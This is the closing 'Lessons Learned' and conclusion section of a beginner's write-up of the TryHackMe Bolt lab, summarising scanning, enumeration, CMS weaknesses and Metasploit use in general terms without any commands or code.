Lessons Learned
This lab taught several important cybersecurity concepts:

1. Enumeration is Critical
Proper scanning and enumeration reveal the attack surface of a system.

2. Web Applications Are Common Targets
Many real-world attacks happen through vulnerable web applications.

3. CMS Platforms Must Be Secured
Outdated or poorly configured CMS systems can easily be exploited.

4. Automation Tools Help
Tools like Metasploit Framework simplify exploitation but understanding the underlying vulnerabilities is essential.

Conclusion
The Bolt room on TryHackMe provides an excellent introduction to web application exploitation.

By completing this lab, I practiced:

Network scanning
Web enumeration
CMS exploitation
Using Metasploit for remote access
This lab is highly recommended for beginners who want to learn the fundamentals of penetration testing.

Practicing labs like this helps build real-world cybersecurity skills.
